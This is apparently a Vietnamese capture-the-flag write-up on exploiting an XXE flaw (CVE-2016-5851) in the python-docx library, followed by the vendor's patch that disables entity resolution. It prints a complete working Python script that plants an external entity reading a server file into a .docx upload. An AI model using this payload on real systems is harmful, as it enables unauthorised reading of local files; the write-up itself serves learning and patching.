---
title: "Matesctf final 2 - XXE Injection"
date: 2018-09-08T09:46:55+07:00
author: "Kev"
comments: true
tags: ["ctf", "flask"]
draft: false
---

{{< figure src="/images/posts/ex50-7.png" >}}

## EXPLOIT - [source](/resources/matesctf/ex50.tar) 
<hr>
Mình nhận thấy lỗi này đầu tiên, mình tưởng đây là LFI cơ, vì cho mình đọc nội dung của cái gì đó (trên hình) và download file nữa. {{<emoji lol>}}

```
python-docx is a Python library for creating and updating Microsoft Word (.docx) files.
```

`Docx` là thư viện sử dụng để xử lý file word. Cũng dễ hiểu đây là lỗi vì không cớ gì mà tác giả lại xử lý file word ở đây cả, chức năng upload và hiển thị nội dung file bình thường thì tại sao lại xử lý file docx làm gì. Sau khi tìm hiểu thì mình tìm được CVE của [docx](https://www.cvedetails.com/cve/CVE-2016-5851/). Tìm hiểu thêm thì đã có exploit sẵn, cụ thể mình cần tạo 1 file docx bất kì rồi chạy payload bên dưới, nhúng nội dung XML vào cuối file word đấy:

{{<highlight python>}}
import docx
import zipfile
import tempfile
import os

# define malicious XML
xml_string = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///home/ctf/ex50/flag" >
]>
<w:document xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
xmlns:w10="urn:schemas-microsoft-com:office:word"
xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing">
<w:body>
<w:p>
<w:pPr>
<w:pStyle w:val="Normal" />
<w:rPr></w:rPr>
</w:pPr>
<w:r>
<w:rPr></w:rPr>
<w:t>
Pierre Ernst, Salesforce --[&xxe;]--
</w:t>
</w:r>
</w:p>
<w:p>
<w:pPr>
<w:pStyle w:val="Normal" />
<w:rPr></w:rPr>
</w:pPr>
<w:r>
<w:rPr></w:rPr>
<w:t></w:t>
</w:r>
</w:p>
<w:sectPr>
<w:type w:val="nextPage" />
<w:pgSz w:w="12240" w:h="15840" />
<w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134"
w:footer="0" w:bottom="1134" w:gutter="0" />
<w:pgNumType w:fmt="decimal" />
<w:formProt w:val="false" />
<w:textDirection w:val="lrTb" />
</w:sectPr>
</w:body>
</w:document>'''

# source: http://stackoverflow.com/questions/25738523/how-to-update-one-file-inside-zip-file-using-python
def updateZip(zipname, filename, data):
    # generate a temp file
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
    os.close(tmpfd)

    # create a temp copy of the archive without filename
    with zipfile.ZipFile(zipname, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
            for item in zin.infolist():
                if item.filename != filename:
                    zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    os.remove(zipname)
    os.rename(tmpname, zipname)

    # now add filename with its new data
    with zipfile.ZipFile(zipname, mode='a',
compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)

# update legit docx file with malicious XML
updateZip('whatever.docx', 'word/document.xml', xml_string)

# process with python-docx
document = docx.Document('whatever.docx')
print '\n\n'.join([paragraph.text for paragraph in document.paragraphs])
{{</highlight>}}

Tại sao lại nén zip? Vì bản chất file docx là 1 file nén chứa nhiều file xml bên trong. Sau khi chạy payload thì đoạn xml đã được chèn vào file document.xml

{{< figure src="/images/posts/ex50-8.png">}}

Vậy là upload bằng cách create exercise và view exercise, ta nhận được flag.

{{< figure src="/images/posts/ex50-9.png">}}

Truy ra nguồn gốc của lỗi này thì do 1 func xử lý exercises đã parse file .docx và lấy nội dung lưu vào database

{{<highlight python>}}
try:
   document = docx.Document(os.path.join(UPLOAD_FOLDER_EX, filename))
   content = '\n\n'.join([paragraph.text for paragraph in document.paragraphs])
except:
   content = "Cannot get content"
Exercises.insert({"name": name, "file_path": file_path,"date":date,"uploader":session['usn'],"content":content})
{{</highlight>}}

Nhờ một thời gian phân tích 1-day nhiều dạng, mình rút ra được cách fix lỗi nhanh nhất là đi tìm bản patch từ nhà cung cấp và đọc xem họ fix như thế nào, như thế sẽ nhanh hơn là tự suy nghĩ cách vá. Các bạn có thể xem bản vá trên [github](https://github.com/python-openxml/python-docx/pull/303/commits/14a44178711cbd860b910f8950f9946addfc5e57). Họ disable XML entity, đây là cách vá hay nhất mà mình biết.

Bước đầu tiên là phải tìm ra được file thư viện nằm ở vị trí nào trên server của mình

{{<highlight bash>}}
$ python -c "import docx; print docx.__file__"
> /usr/local/lib/python2.7/dist-packages/docx/__init__.pyc
{{</highlight>}}

Từ link github trên mình cũng biết là file cần fix là `docx/oxml/__init__.py` . Chỉ cần sửa dòng số 17 thôi là đủ

```
oxml_parser = etree.XMLParser(remove_blank_text=True,resolve_entities=False)
```

{{< figure src="/images/posts/ex50-10.png">}}

NHƯNG, đời không như mơ đâu các bạn à !!! Chúng ta không có quyền để sửa file `__init__.py`

## SOLUTIONS
<hr>
To be continue ...
